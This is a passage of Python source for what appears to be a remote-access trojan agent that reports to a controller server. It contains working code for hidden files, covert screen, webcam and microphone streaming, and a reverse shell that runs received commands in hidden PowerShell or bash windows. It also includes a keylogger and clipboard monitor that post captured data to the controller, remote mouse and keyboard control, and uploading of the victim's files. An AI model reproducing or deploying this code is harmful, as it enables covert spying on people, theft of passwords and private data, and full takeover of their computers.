        if WINDOWS_AVAILABLE:
            try:
                win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
        return agent_id

def stream_screen(agent_id):
    """
    High-performance screen streaming with 60+ FPS capability.
    Uses optimized capture backend and compression.
    """
    global STREAMING_ENABLED
    
    # Check if required dependencies are available
    if not MSS_AVAILABLE:
        print("Error: mss not available for screen capture")
        return
    
    if not NUMPY_AVAILABLE:
        print("Error: numpy not available for screen capture")
        return
    
    if not CV2_AVAILABLE:
        print("Error: opencv-python not available for screen capture")
        return
    
    # Use the working fallback implementation directly
    print("Starting screen streaming...")
    _stream_screen_fallback(agent_id)

def _stream_screen_fallback(agent_id):
    """
    Fallback screen streaming with basic optimizations and retry logic
    """
    global STREAMING_ENABLED
    import time
    retry_delay = 5  # seconds
    # Check if required dependencies are available
    if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
        print("Error: Required dependencies not available for screen capture")
        return
    url = f"{SERVER_URL}/stream/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}
    while STREAMING_ENABLED:
        try:
            with mss.mss() as sct:
                monitors = sct.monitors
                monitor_index = 1
                print(f"Using monitor {monitor_index}: {monitors[monitor_index]}")
                target_fps = 30
                frame_time = 1.0 / target_fps
                last_frame_hash = None
                frame_skip_count = 0
                while STREAMING_ENABLED:
                    current_time = time.time()
                    sct_img = sct.grab(monitors[monitor_index])
                    img = np.array(sct_img)
                    import hashlib
                    frame_hash = hashlib.md5(img.tobytes()).hexdigest()
                    if frame_hash == last_frame_hash:
                        frame_skip_count += 1
                        if frame_skip_count < 3:
                            time.sleep(frame_time * 0.5)
                            continue
                    last_frame_hash = frame_hash
                    frame_skip_count = 0
                    height, width = img.shape[:2]
                    if width > 1280:
                        scale = 1280 / width
                        new_width = int(width * scale)
                        new_height = int(height * scale)
                        img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
                    is_success, buffer = cv2.imencode(".jpg", img, [
                        cv2.IMWRITE_JPEG_QUALITY, 80,
                        cv2.IMWRITE_JPEG_OPTIMIZE, 1,
                        cv2.IMWRITE_JPEG_PROGRESSIVE, 1
                    ])
                    if not is_success:
                        continue
                    try:
                        response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.1)
                        if response.status_code != 200:
                            print(f"Warning: Server returned status {response.status_code}")
                    except requests.exceptions.Timeout:
                        pass
                    except requests.exceptions.RequestException as e:
                        print(f"Request error: {e}. Retrying in {retry_delay}s...")
                        time.sleep(retry_delay)
                        break  # Break inner loop to retry outer
                    elapsed = time.time() - current_time
                    sleep_time = max(0, frame_time - elapsed)
                    if sleep_time > 0:
                        time.sleep(sleep_time)
        except Exception as e:
            print(f"Screen capture initialization error: {e}. Retrying in {retry_delay}s...")
            time.sleep(retry_delay)

def stream_camera(agent_id):
    """
    Captures the webcam and streams it to the controller at high FPS. Retry logic added.
    """
    global CAMERA_STREAMING_ENABLED
    import time
    retry_delay = 5
    if not CV2_AVAILABLE:
        print("Error: opencv-python not available for camera capture")
        return
    url = f"{SERVER_URL}/camera/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}
    while CAMERA_STREAMING_ENABLED:
        try:
            cap = None
            backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY] if WINDOWS_AVAILABLE else [cv2.CAP_V4L2, cv2.CAP_ANY]
            for backend in backends:
                try:
                    cap = cv2.VideoCapture(0, backend)
                    if cap.isOpened():
                        print(f"Camera opened successfully with backend {backend}")
                        break
                    else:
                        cap.release()
                except Exception as e:
                    print(f"Failed to open camera with backend {backend}: {e}")
                    if cap:
                        cap.release()
            if not cap or not cap.isOpened():
                print("Error: Could not open camera with any backend. Retrying in {retry_delay}s...")
                time.sleep(retry_delay)
                continue
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, 30)
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            actual_width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
            actual_height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
            actual_fps = cap.get(cv2.CAP_PROP_FPS)
            print(f"Camera initialized: {actual_width}x{actual_height} @ {actual_fps}fps")
            frame_count = 0
            start_time = time.time()
            while CAMERA_STREAMING_ENABLED:
                try:
                    ret, frame = cap.read()
                    if not ret:
                        print("Error: Could not read frame from camera")
                        time.sleep(0.1)
                        continue
                    frame_count += 1
                    frame = cv2.resize(frame, (640, 480))
                    is_success, buffer = cv2.imencode(".jpg", frame, [
                        cv2.IMWRITE_JPEG_QUALITY, 85,
                        cv2.IMWRITE_JPEG_OPTIMIZE, 1
                    ])
                    if not is_success:
                        continue
                    try:
                        response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
                        if response.status_code != 200:
                            print(f"Warning: Camera stream server returned status {response.status_code}")
                    except requests.exceptions.Timeout:
                        pass
                    except requests.exceptions.RequestException as e:
                        print(f"Camera stream request error: {e}. Retrying in {retry_delay}s...")
                        time.sleep(retry_delay)
                        break
                    if frame_count % 30 == 0:
                        elapsed = time.time() - start_time
                        fps = frame_count / elapsed
                        print(f"Camera streaming at {fps:.1f} FPS")
                    time.sleep(1/30)
                except Exception as e:
                    print(f"Camera stream error: {e}")
                    time.sleep(0.5)
            cap.release()
            print("Camera streaming stopped")
        except Exception as e:
            print(f"Camera initialization error: {e}. Retrying in {retry_delay}s...")
            time.sleep(retry_delay)

def stream_audio(agent_id):
    """
    Captures microphone audio and streams it to the controller. Retry logic added.
    """
    global AUDIO_STREAMING_ENABLED
    import time
    retry_delay = 5
    if not PYAUDIO_AVAILABLE or FORMAT is None:
        print("Error: PyAudio not available for audio capture")
        return
    url = f"{SERVER_URL}/audio/{agent_id}"
    while AUDIO_STREAMING_ENABLED:
        try:
            p = pyaudio.PyAudio()
            input_devices = []
            for i in range(p.get_device_count()):
                try:
                    device_info = p.get_device_info_by_index(i)
                    if device_info['maxInputChannels'] > 0:
                        input_devices.append((i, device_info['name']))
                except Exception:
                    continue
            print(f"Available input devices: {len(input_devices)}")
            for idx, name in input_devices:
                print(f"  Device {idx}: {name}")
            input_device_index = None
            try:
                default_device_info = p.get_default_input_device_info()
                print(f"Default audio device: {default_device_info['name']}")
                input_device_index = default_device_info['index']
            except Exception as e:
                print(f"Could not get default audio device: {e}")
                if input_devices:
                    input_device_index = input_devices[0][0]
                    print(f"Using first available device: {input_devices[0][1]}")
            if input_device_index is None:
                print("Error: No audio input devices available. Retrying in {retry_delay}s...")
                p.terminate()
                time.sleep(retry_delay)
                continue
            try:
                stream = p.open(
                    format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK,
                    input_device_index=input_device_index
                )
                print(f"Audio stream opened successfully with device {input_device_index}")
            except Exception as e:
                print(f"Failed to open audio stream: {e}. Retrying in {retry_delay}s...")
                p.terminate()
                time.sleep(retry_delay)
                continue
            frame_count = 0
            start_time = time.time()
            while AUDIO_STREAMING_ENABLED:
                try:
                    data = stream.read(CHUNK, exception_on_overflow=False)
                    frame_count += 1
                    try:
                        response = requests.post(url, data=data, timeout=1)
                        if response.status_code != 200:
                            print(f"Warning: Audio stream server returned status {response.status_code}")
                    except requests.exceptions.Timeout:
                        pass
                    except requests.exceptions.RequestException as e:
                        print(f"Audio stream request error: {e}. Retrying in {retry_delay}s...")
                        time.sleep(retry_delay)
                        break
                    if frame_count % 100 == 0:
                        elapsed = time.time() - start_time
                        fps = frame_count / elapsed
                        print(f"Audio streaming at {fps:.1f} FPS")
                except Exception as e:
                    print(f"Audio stream error: {e}")
                    break
            stream.stop_stream()
            stream.close()
            p.terminate()
            print("Audio streaming stopped")
        except Exception as e:
            print(f"Audio initialization error: {e}. Retrying in {retry_delay}s...")
            AUDIO_STREAMING_ENABLED = False
            time.sleep(retry_delay)

def start_streaming(agent_id):
    global STREAMING_ENABLED, STREAM_THREAD
    if not STREAMING_ENABLED:
        STREAMING_ENABLED = True
        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
        STREAM_THREAD.daemon = True
        STREAM_THREAD.start()
        print("Started video stream.")

def stop_streaming():
    global STREAMING_ENABLED, STREAM_THREAD
    if STREAMING_ENABLED:
        STREAMING_ENABLED = False
        if STREAM_THREAD:
            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
            STREAM_THREAD.join(timeout=2)
        STREAM_THREAD = None
        print("Stopped video stream.")

def start_audio_streaming(agent_id):
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if not AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = True
        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
        AUDIO_STREAM_THREAD.daemon = True
        AUDIO_STREAM_THREAD.start()
        print("Started audio stream.")

def stop_audio_streaming():
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = False
        if AUDIO_STREAM_THREAD:
            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
            AUDIO_STREAM_THREAD.join(timeout=2)
        AUDIO_STREAM_THREAD = None
        print("Stopped audio stream.")

def start_camera_streaming(agent_id):
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if not CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = True
        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
        CAMERA_STREAM_THREAD.daemon = True
        CAMERA_STREAM_THREAD.start()
        print("Started camera stream.")

def stop_camera_streaming():
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = False
        if CAMERA_STREAM_THREAD:
            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
            CAMERA_STREAM_THREAD.join(timeout=2)
        CAMERA_STREAM_THREAD = None
        print("Stopped camera stream.")

# --- Reverse Shell Functions ---

def reverse_shell_handler(agent_id):
    """
    Handles reverse shell connections and command execution.
    This function runs in a separate thread.
    """
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_SOCKET
    
    try:
        # Create socket connection back to controller
        REVERSE_SHELL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Parse SERVER_URL properly
        try:
            if SERVER_URL.startswith("https://"):
                controller_host = SERVER_URL.split("://")[1].split(":")[0].split("/")[0]
            elif SERVER_URL.startswith("http://"):
                controller_host = SERVER_URL.split("://")[1].split(":")[0].split("/")[0]
            else:
                # Assume it's just a hostname
                controller_host = SERVER_URL.split(":")[0].split("/")[0]
        except Exception as e:
            print(f"Error parsing SERVER_URL: {e}")
            controller_host = "localhost"  # Fallback
        
        controller_port = 9999  # Dedicated port for reverse shell
        
        print(f"Attempting reverse shell connection to {controller_host}:{controller_port}")
        
        # Set socket timeout
        REVERSE_SHELL_SOCKET.settimeout(10)
        REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
        print(f"Reverse shell connected to {controller_host}:{controller_port}")
        
        # Send initial connection info
        system_info = {
            "agent_id": agent_id,
            "hostname": socket.gethostname(),
            "platform": os.name,
            "cwd": os.getcwd(),
            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        }
        REVERSE_SHELL_SOCKET.send(json.dumps(system_info).encode() + b'\n')
        
        while REVERSE_SHELL_ENABLED:
            try:
                # Receive command from controller
                data = REVERSE_SHELL_SOCKET.recv(4096)
                if not data:
                    print("No data received from controller, breaking connection")
                    break
                    
                command = data.decode().strip()
                if not command:
                    continue
                    
                print(f"Received command: {command}")
                
                # Handle special commands
                if command.lower() == "exit":
                    print("Received exit command")
                    break
                elif command.startswith("cd "):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        response = f"Changed directory to: {os.getcwd()}\n"
                    except Exception as e:
                        response = f"cd error: {str(e)}\n"
                else:
                    # Execute regular command
                    try:
                        if WINDOWS_AVAILABLE:
                            # Fix PowerShell execution - use proper command formatting
                            if command.strip().lower().startswith('powershell'):
                                # If it's already a PowerShell command, execute directly
                                result = subprocess.run(
                                    ["powershell.exe", "-NoProfile", "-Command", command],
                                    capture_output=True,
                                    text=True,
                                    timeout=30,
                                    creationflags=subprocess.CREATE_NO_WINDOW
                                )
                            else:
                                # For regular commands, wrap in PowerShell properly
                                result = subprocess.run(
                                    ["powershell.exe", "-NoProfile", "-Command", f"& {{{command}}}"],
                                    capture_output=True,
                                    text=True,
                                    timeout=30,
                                    creationflags=subprocess.CREATE_NO_WINDOW
                                )
                        else:
                            result = subprocess.run(
                                ["bash", "-c", command],
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                        response = result.stdout + result.stderr
                        if not response:
                            response = "[Command executed successfully - no output]\n"
                    except subprocess.TimeoutExpired:
                        response = "[Command timed out after 30 seconds]\n"
                    except Exception as e:
                        response = f"[Command execution error: {str(e)}]\n"
                
                # Send response back
                try:
                    REVERSE_SHELL_SOCKET.send(response.encode())
                except Exception as e:
                    print(f"Error sending response: {e}")
                    break
                
            except socket.timeout:
                continue
            except Exception as e:
                print(f"Reverse shell error: {e}")
                break
                
    except Exception as e:
        print(f"Reverse shell connection error: {e}")
    finally:
        if REVERSE_SHELL_SOCKET:
            try:
                REVERSE_SHELL_SOCKET.close()
            except:
                pass
        REVERSE_SHELL_SOCKET = None
        print("Reverse shell disconnected")

def start_reverse_shell(agent_id):
    """Start the reverse shell connection."""
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD
    if not REVERSE_SHELL_ENABLED:
        REVERSE_SHELL_ENABLED = True
        REVERSE_SHELL_THREAD = threading.Thread(target=reverse_shell_handler, args=(agent_id,))
        REVERSE_SHELL_THREAD.daemon = True
        REVERSE_SHELL_THREAD.start()
        print("Started reverse shell.")

def stop_reverse_shell():
    """Stop the reverse shell connection."""
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD, REVERSE_SHELL_SOCKET
    if REVERSE_SHELL_ENABLED:
        REVERSE_SHELL_ENABLED = False
        if REVERSE_SHELL_SOCKET:
            try:
                REVERSE_SHELL_SOCKET.close()
            except:
                pass
        if REVERSE_SHELL_THREAD and REVERSE_SHELL_THREAD.is_alive():
            try:
                REVERSE_SHELL_THREAD.join(timeout=1)  # Reduced timeout
            except Exception as e:
                print(f"Warning: Could not join reverse shell thread: {e}")
        REVERSE_SHELL_THREAD = None
        print("Stopped reverse shell.")

# --- Voice Control Functions ---

def voice_control_handler(agent_id):
    """
    Handles voice recognition and command processing.
    This function runs in a separate thread.
    """
    global VOICE_CONTROL_ENABLED, VOICE_RECOGNIZER
    
    if not SPEECH_RECOGNITION_AVAILABLE:
        print("Speech recognition not available - install speechrecognition library")
        return
    
    VOICE_RECOGNIZER = sr.Recognizer()
    microphone = sr.Microphone()
    
    # Adjust for ambient noise
    with microphone as source:
        print("Adjusting for ambient noise... Please wait.")
        VOICE_RECOGNIZER.adjust_for_ambient_noise(source)
        print("Voice control ready. Listening for commands...")
    
    while VOICE_CONTROL_ENABLED:
        try:
            with microphone as source:
                # Listen for audio with timeout
                audio = VOICE_RECOGNIZER.listen(source, timeout=1, phrase_time_limit=5)
            
            try:
                # Recognize speech using Google Speech Recognition
                command = VOICE_RECOGNIZER.recognize_google(audio).lower()
                print(f"Voice command received: {command}")
                
                # Process voice commands
                if "screenshot" in command or "screen shot" in command:
                    execute_voice_command("screenshot", agent_id)
                elif "open camera" in command or "start camera" in command:
                    execute_voice_command("start-camera", agent_id)
                elif "close camera" in command or "stop camera" in command:
                    execute_voice_command("stop-camera", agent_id)
                elif "start streaming" in command or "start stream" in command:
                    execute_voice_command("start-stream", agent_id)
                elif "stop streaming" in command or "stop stream" in command:
                    execute_voice_command("stop-stream", agent_id)
                elif "system info" in command or "system information" in command:
                    execute_voice_command("systeminfo", agent_id)
                elif "list processes" in command or "show processes" in command:
                    if WINDOWS_AVAILABLE:
                        execute_voice_command("Get-Process | Select-Object Name, Id | Format-Table", agent_id)
                    else:
                        execute_voice_command("ps aux", agent_id)
                elif "current directory" in command or "where am i" in command:
                    execute_voice_command("pwd", agent_id)
                elif command.startswith("run ") or command.startswith("execute "):
                    # Extract command after "run" or "execute"
                    actual_command = command.split(" ", 1)[1] if " " in command else ""
                    if actual_command:
                        execute_voice_command(actual_command, agent_id)
                else:
                    print(f"Unknown voice command: {command}")
                    
            except sr.UnknownValueError:
                # Speech not recognized - this is normal, just continue
                pass
            except sr.RequestError as e:
                print(f"Could not request results from speech recognition service: {e}")
                time.sleep(1)
                
        except sr.WaitTimeoutError:
            # Timeout waiting for audio - this is normal, just continue
            pass
        except Exception as e:
            print(f"Voice control error: {e}")
            time.sleep(1)

def execute_voice_command(command, agent_id):
    """Execute a command received via voice control."""
    try:
        # Send command to controller for execution
        url = f"{SERVER_URL}/voice_command/{agent_id}"
        response = requests.post(url, json={"command": command}, timeout=5)
        print(f"Voice command '{command}' sent to controller")
    except Exception as e:
        print(f"Error sending voice command: {e}")

def start_voice_control(agent_id):
    """Start voice control functionality."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    if not VOICE_CONTROL_ENABLED:
        VOICE_CONTROL_ENABLED = True
        VOICE_CONTROL_THREAD = threading.Thread(target=voice_control_handler, args=(agent_id,))
        VOICE_CONTROL_THREAD.daemon = True
        VOICE_CONTROL_THREAD.start()
        print("Started voice control.")

def stop_voice_control():
    """Stop voice control functionality."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    if VOICE_CONTROL_ENABLED:
        VOICE_CONTROL_ENABLED = False
        if VOICE_CONTROL_THREAD:
            VOICE_CONTROL_THREAD.join(timeout=2)
        VOICE_CONTROL_THREAD = None
        print("Stopped voice control.")

# --- Remote Control Functions ---

# Global variables for remote control
REMOTE_CONTROL_ENABLED = False
LOW_LATENCY_INPUT_HANDLER = None
# Removed duplicate controller variables - using mouse_controller and keyboard_controller instead

def initialize_low_latency_input():
    """Initialize the low-latency input handler"""
    global LOW_LATENCY_INPUT_HANDLER, low_latency_input
    
    try:
        # Use the LowLatencyInputHandler class defined in this file
        LOW_LATENCY_INPUT_HANDLER = LowLatencyInputHandler(max_queue_size=2000)
        LOW_LATENCY_INPUT_HANDLER.start()
        low_latency_input = LOW_LATENCY_INPUT_HANDLER  # Set both variables for compatibility
        print("Low-latency input handler initialized")
        return True
    except Exception as e:
        print(f"Failed to initialize low latency input: {e}")
        return False

def handle_remote_control(command_data):
    """Handle remote control commands with ultra-low latency."""
    global LOW_LATENCY_INPUT_HANDLER
    
    try:
        # Try to use low-latency input handler first
        if LOW_LATENCY_INPUT_HANDLER:
            success = LOW_LATENCY_INPUT_HANDLER.handle_input(command_data)
            if success:
                return
            else:
                print("Low-latency input queue full, using fallback")
        
        # Fallback to direct handling
        _handle_remote_control_fallback(command_data)
        
    except Exception as e:
        print(f"Error handling remote control command: {e}")
        _handle_remote_control_fallback(command_data)

def _handle_remote_control_fallback(command_data):
    """Fallback remote control handling (original implementation optimized)"""
    global mouse_controller, keyboard_controller
    
    # Import here to avoid conflicts
    from pynput import mouse, keyboard
    
    # Initialize controllers if needed
    if mouse_controller is None:
        mouse_controller = mouse.Controller()
    if keyboard_controller is None:
        keyboard_controller = keyboard.Controller()
    
    try:
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if action == "mouse_move":
            handle_mouse_move(data)
        elif action == "mouse_click":
            handle_mouse_click(data)
        elif action == "key_down":
            handle_key_down(data)
        elif action == "key_up":
            handle_key_up(data)
        else:
            print(f"Unknown remote control action: {action}")
            
    except Exception as e:
        print(f"Error handling remote control command: {e}")

def get_input_performance_stats():
    """Get input performance statistics"""
    global LOW_LATENCY_INPUT_HANDLER
    
    if LOW_LATENCY_INPUT_HANDLER:
        return LOW_LATENCY_INPUT_HANDLER.get_performance_stats()
    else:
        return {"status": "fallback_mode", "low_latency": False}

def handle_mouse_move(data):
    """Handle mouse movement commands."""
    try:
        x = data.get("x", 0)  # Relative position (0-1)
        y = data.get("y", 0)  # Relative position (0-1)
        sensitivity = data.get("sensitivity", 1.0)
        
        # Get screen dimensions
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screen_width = monitor["width"]
            screen_height = monitor["height"]
        
        # Convert relative position to absolute
        abs_x = int(x * screen_width * sensitivity)
        abs_y = int(y * screen_height * sensitivity)
        
        # Move mouse
        mouse_controller.position = (abs_x, abs_y)
        
    except Exception as e:
        print(f"Error handling mouse move: {e}")

def handle_mouse_click(data):
    """Handle mouse click commands."""
    try:
        button = data.get("button", "left")
        
        if button == "left":
            mouse_controller.click(mouse.Button.left, 1)
        elif button == "right":
            mouse_controller.click(mouse.Button.right, 1)
        elif button == "middle":
            mouse_controller.click(mouse.Button.middle, 1)
            
    except Exception as e:
        print(f"Error handling mouse click: {e}")

def handle_key_down(data):
    """Handle key press commands."""
    try:
        key = data.get("key")
        code = data.get("code")
        
        if key:
            # Map special keys
            if key == "Enter":
                keyboard_controller.press(keyboard.Key.enter)
            elif key == "Escape":
                keyboard_controller.press(keyboard.Key.esc)
            elif key == "Backspace":
                keyboard_controller.press(keyboard.Key.backspace)
            elif key == "Tab":
                keyboard_controller.press(keyboard.Key.tab)
            elif key == "Shift":
                keyboard_controller.press(keyboard.Key.shift)
            elif key == "Control":
                keyboard_controller.press(keyboard.Key.ctrl)
            elif key == "Alt":
                keyboard_controller.press(keyboard.Key.alt)
            elif key == "Delete":
                keyboard_controller.press(keyboard.Key.delete)
            elif key == "Home":
                keyboard_controller.press(keyboard.Key.home)
            elif key == "End":
                keyboard_controller.press(keyboard.Key.end)
            elif key == "PageUp":
                keyboard_controller.press(keyboard.Key.page_up)
            elif key == "PageDown":
                keyboard_controller.press(keyboard.Key.page_down)
            elif key.startswith("Arrow"):
                direction = key[5:].lower()  # Remove "Arrow" prefix
                if direction == "up":
                    keyboard_controller.press(keyboard.Key.up)
                elif direction == "down":
                    keyboard_controller.press(keyboard.Key.down)
                elif direction == "left":
                    keyboard_controller.press(keyboard.Key.left)
                elif direction == "right":
                    keyboard_controller.press(keyboard.Key.right)
            elif key.startswith("F") and key[1:].isdigit():
                # Function keys
                f_num = int(key[1:])
                if 1 <= f_num <= 12:
                    f_key = getattr(keyboard.Key, f"f{f_num}")
                    keyboard_controller.press(f_key)
            elif len(key) == 1:
                # Regular character
                keyboard_controller.press(key)
                
    except Exception as e:
        print(f"Error handling key down: {e}")

def handle_key_up(data):
    """Handle key release commands."""
    try:
        key = data.get("key")
        code = data.get("code")
        
        if key:
            # Map special keys
            if key == "Enter":
                keyboard_controller.release(keyboard.Key.enter)
            elif key == "Escape":
                keyboard_controller.release(keyboard.Key.esc)
            elif key == "Backspace":
                keyboard_controller.release(keyboard.Key.backspace)
            elif key == "Tab":
                keyboard_controller.release(keyboard.Key.tab)
            elif key == "Shift":
                keyboard_controller.release(keyboard.Key.shift)
            elif key == "Control":
                keyboard_controller.release(keyboard.Key.ctrl)
            elif key == "Alt":
                keyboard_controller.release(keyboard.Key.alt)
            elif key == "Delete":
                keyboard_controller.release(keyboard.Key.delete)
            elif key == "Home":
                keyboard_controller.release(keyboard.Key.home)
            elif key == "End":
                keyboard_controller.release(keyboard.Key.end)
            elif key == "PageUp":
                keyboard_controller.release(keyboard.Key.page_up)
            elif key == "PageDown":
                keyboard_controller.release(keyboard.Key.page_down)
            elif key.startswith("Arrow"):
                direction = key[5:].lower()  # Remove "Arrow" prefix
                if direction == "up":
                    keyboard_controller.release(keyboard.Key.up)
                elif direction == "down":
                    keyboard_controller.release(keyboard.Key.down)
                elif direction == "left":
                    keyboard_controller.release(keyboard.Key.left)
                elif direction == "right":
                    keyboard_controller.release(keyboard.Key.right)
            elif key.startswith("F") and key[1:].isdigit():
                # Function keys
                f_num = int(key[1:])
                if 1 <= f_num <= 12:
                    f_key = getattr(keyboard.Key, f"f{f_num}")
                    keyboard_controller.release(f_key)
            elif len(key) == 1:
                # Regular character
                keyboard_controller.release(key)
                
    except Exception as e:
        print(f"Error handling key up: {e}")

# --- Keylogger Functions ---

def on_key_press(key):
    """Callback for key press events."""
    global KEYLOG_BUFFER
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Regular character
            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: '{key.char}'")
        else:
            # Special key
            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [{key}]")
    except Exception as e:
        KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [ERROR: {e}]")

def keylogger_worker(agent_id):
    """Keylogger worker thread that sends data periodically."""
    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
    url = f"{SERVER_URL}/keylog_data/{agent_id}"
    
    while KEYLOGGER_ENABLED:
        try:
            if KEYLOG_BUFFER:
                # Send accumulated keylog data
                data_to_send = KEYLOG_BUFFER.copy()
                KEYLOG_BUFFER = []
                
                for entry in data_to_send:
                    requests.post(url, json={"data": entry}, timeout=5)
            
            time.sleep(5)  # Send data every 5 seconds
        except Exception as e:
            print(f"Keylogger error: {e}")
            time.sleep(5)

def start_keylogger(agent_id):
    """Start the keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    if not KEYLOGGER_ENABLED:
        KEYLOGGER_ENABLED = True
        
        # Start keyboard listener
        listener = keyboard.Listener(on_press=on_key_press)
        listener.daemon = True
        listener.start()
        
        # Start worker thread
        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
        KEYLOGGER_THREAD.daemon = True
        KEYLOGGER_THREAD.start()
        
        print("Started keylogger.")

def stop_keylogger():
    """Stop the keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    if KEYLOGGER_ENABLED:
        KEYLOGGER_ENABLED = False
        if KEYLOGGER_THREAD:
            KEYLOGGER_THREAD.join(timeout=2)
        KEYLOGGER_THREAD = None
        print("Stopped keylogger.")

# --- Clipboard Monitor Functions ---

def get_clipboard_content():
    """Get current clipboard content."""
    if WINDOWS_AVAILABLE:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        except:
            try:
                win32clipboard.CloseClipboard()
            except:
                pass
            return None
    else:
        # On Linux, we'll skip clipboard monitoring for now
        return None

def clipboard_monitor_worker(agent_id):
    """Clipboard monitor worker thread."""
    global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
    url = f"{SERVER_URL}/clipboard_data/{agent_id}"
    
    while CLIPBOARD_MONITOR_ENABLED:
        try:
            current_content = get_clipboard_content()
            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
                
                requests.post(url, json={"data": clipboard_entry}, timeout=5)
                LAST_CLIPBOARD_CONTENT = current_content
            
            time.sleep(2)  # Check clipboard every 2 seconds
        except Exception as e:
            print(f"Clipboard monitor error: {e}")
            time.sleep(2)

def start_clipboard_monitor(agent_id):
    """Start clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    if not CLIPBOARD_MONITOR_ENABLED:
        CLIPBOARD_MONITOR_ENABLED = True
        CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
        CLIPBOARD_MONITOR_THREAD.daemon = True
        CLIPBOARD_MONITOR_THREAD.start()
        print("Started clipboard monitor.")

def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    if CLIPBOARD_MONITOR_ENABLED:
        CLIPBOARD_MONITOR_ENABLED = False
        if CLIPBOARD_MONITOR_THREAD:
            CLIPBOARD_MONITOR_THREAD.join(timeout=2)
        CLIPBOARD_MONITOR_THREAD = None
        print("Stopped clipboard monitor.")

# --- File Management Functions ---

def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
    """Send a file to the controller in chunks using Socket.IO."""
    if not os.path.exists(file_path):
        return f"File not found: {file_path}"
    chunk_size = 512 * 1024  # 512KB
    filename = os.path.basename(file_path)
    total_size = os.path.getsize(file_path)
    print(f"Sending file {file_path} ({total_size} bytes) to controller in chunks...")
    with open(file_path, 'rb') as f:
        offset = 0
        chunk_count = 0
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
            sio.emit('file_chunk_from_agent', {
                'agent_id': agent_id,
                'filename': filename,
                'chunk': chunk_b64,
                'offset': offset,
                'total_size': total_size,
                'destination_path': destination_path or file_path
            })
            offset += len(chunk)
            chunk_count += 1
            print(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
    # Notify upload complete
    sio.emit('upload_file_end', {
        'agent_id': agent_id,
        'filename': filename,
        'destination_path': destination_path or file_path
    })
    print(f"File upload complete notification sent for {filename}")
    return f"File {file_path} sent to controller in {chunk_count} chunks"

def handle_file_upload(command_parts):
    """Handle file upload from controller (deprecated, now uses chunked)."""
    return "File upload via HTTP POST is deprecated. Use chunked Socket.IO upload."

def handle_file_download(command_parts, agent_id):
    """Handle file download request from controller (deprecated, now uses chunked)."""
    return "File download via HTTP POST is deprecated. Use chunked Socket.IO download."

# --- Socket.IO File Transfer Handlers ---

@sio.on('file_chunk_from_operator')
